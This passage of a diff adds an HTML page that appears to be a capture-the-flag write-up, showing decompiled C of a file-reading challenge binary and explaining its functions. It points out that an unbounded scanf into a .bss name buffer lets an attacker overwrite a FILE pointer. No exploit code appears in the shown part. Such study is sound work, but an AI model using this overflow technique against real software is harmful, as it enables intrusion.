+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;do &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;{
+    menu();
+    __isoc99_scanf(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,input_str);
+    input &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;atoi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(input_str);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;switch&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(input) {
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;default&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Invaild choice&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+                    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* WARNING: Subroutine does not return *&#x2F;
+      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;case &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+      openfile();
+      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;case &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+      readfile();
+      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;case &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+      writefile();
+      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;case &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+      closefile();
+      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;case &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;:
+      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Leave your name :&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+                    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* can overwrite fp *&#x2F;
+      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;__isoc99_scanf(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,name);
+      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Thank you &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt; ,see you next time&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,name);
+      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(FILE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;fclose&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp);
+      }
+                    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* WARNING: Subroutine does not return *&#x2F;
+      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+    }
+  } &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;while&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;( &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;true &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The use of &lt;code&gt;scanf&lt;&#x2F;code&gt; without a maximum width specified allows for a buffer overflow attack in the .bss section. Overflowing 
+the &lt;code&gt;name&lt;&#x2F;code&gt; buffer allows us to overwrite &lt;code&gt;FILE *fp&lt;&#x2F;code&gt;. &lt;&#x2F;p&gt;
+&lt;h2 id=&quot;openfile&quot;&gt;openfile&lt;&#x2F;h2&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;openfile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;){
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; iVar1;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;pcVar2;
+  
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(FILE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;memset&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(filebuf,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;400&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;What do you want to see :&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+    __isoc99_scanf(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%63s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,filename);
+    pcVar2 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;strstr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(filename,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;flag&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(pcVar2 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Danger !&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+                    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* WARNING: Subroutine does not return *&#x2F;
+      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+    }
+    fp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;fopen&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(filename,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;r&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(FILE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+      iVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Open failed&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+    }
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;{
+      iVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Open Successful&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+    }
+  }
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;{
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;You need to close the file first&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+    iVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+  }
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; iVar1;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;This opens any file without &lt;code&gt;flag&lt;&#x2F;code&gt; in its name and stores its file descriptor (&lt;code&gt;FILE *&lt;&#x2F;code&gt;) in &lt;code&gt;fp&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;readfile&quot;&gt;readfile&lt;&#x2F;h2&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;readfile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;){
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;size_t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;sVar1;
+  
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;memset&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(filebuf,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;400&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(FILE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;You need to open a file first&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  }
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;{
+    sVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;fread&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(filebuf,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;399&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,fp);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(sVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Read Successful&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+    }
+  }
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;This reads the next 399 characters of the previously opened file into a buffer in memory.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;writefile&quot;&gt;writefile&lt;&#x2F;h2&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;writefile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;pcVar1;
+  
+  pcVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;strstr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(filename,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;flag&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(pcVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+    pcVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;strstr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(filebuf,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;FLAG&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(pcVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+                    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* ASCII &amp;#39;}&amp;#39; *&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;
+      pcVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;strchr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(filebuf,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x7d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(pcVar1 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
+        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(filebuf);
+        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+      }
+    }
+  }
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;you can&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;t see it&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+                    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* WARNING: Subroutine does not return *&#x2F;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;This prints the contents of the previously loaded memory buffer as long as it doesn&#x27;t contain &amp;quot;FLAG&amp;quot; or the character &#x27;}&#x27;.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;closefile&quot;&gt;closefile&lt;&#x2F;h2&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;closefile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+{
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(FILE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
